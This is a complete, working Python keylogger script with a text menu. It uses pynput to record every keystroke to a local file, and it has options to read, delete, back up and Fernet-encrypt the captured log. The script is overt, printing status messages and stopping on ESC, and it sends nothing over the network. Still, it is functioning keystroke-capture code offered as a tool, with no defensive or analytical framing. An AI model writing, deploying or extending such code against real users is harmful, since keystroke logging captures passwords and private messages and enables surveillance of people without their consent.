from pynput import keyboard
import os
import shutil
from cryptography.fernet import Fernet

LOG_FILE = "keylog.txt"
ENCRYPTED_FILE = "keylog_encrypted.txt"
BACKUP_FILE = "backup_keylog.txt"

# Keylogger function
def start_keylogger():
    print("🎯 Keylogger started... Press ESC to stop.")

    def on_press(key):
        try:
            with open(LOG_FILE, "a") as f:
                f.write(f"{key.char}")
        except AttributeError:
            with open(LOG_FILE, "a") as f:
                f.write(f" [{key}] ")

        # Stop keylogger on ESC key
        if key == keyboard.Key.esc:
            print("🛑 ESC pressed. Stopping keylogger.")
            return False

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Read log file
def read_log():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            data = f.read()
            print("\n--- Logged Keystrokes ---")
            print(data)
            print("--------------------------\n")
    else:
        print("❌ Log file not found.")

# Delete log file
def delete_log():
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
        print("✅ Log file deleted.")
    else:
        print("❌ Log file not found.")

# Backup log file
def backup_log():
    if os.path.exists(LOG_FILE):
        shutil.copy(LOG_FILE, BACKUP_FILE)
        print(f"✅ Backup created as '{BACKUP_FILE}'.")
    else:
        print("❌ Log file not found.")

# Encrypt log file
def encrypt_log():
    if not os.path.exists(LOG_FILE):
        print("❌ Log file not found.")
        return

    key = Fernet.generate_key()
    cipher = Fernet(key)

    with open(LOG_FILE, "rb") as f:
        data = f.read()

    encrypted_data = cipher.encrypt(data)

    with open(ENCRYPTED_FILE, "wb") as f:
        f.write(encrypted_data)

    print(f"✅ File encrypted as '{ENCRYPTED_FILE}'.")
    print(f"🔑 Save this key to decrypt later:\n{key.decode()}")

# Menu system
def menu():
    while True:
        print("""
========= Keylogger Tool =========
1. Start Keylogger
2. Read Log File
3. Delete Log File
4. Backup Log File
5. Encrypt Log File
6. Exit
""")
        choice = input("Enter your choice (1-6): ").strip()

        if choice == '1':
            start_keylogger()
        elif choice == '2':
            read_log()
        elif choice == '3':
            delete_log()
        elif choice == '4':
            backup_log()
        elif choice == '5':
            encrypt_log()
        elif choice == '6':
            print("Exiting... ✅")
            break
        else:
            print("❌ Invalid choice. Please enter 1-6.")

if __name__ == "__main__":
    menu()
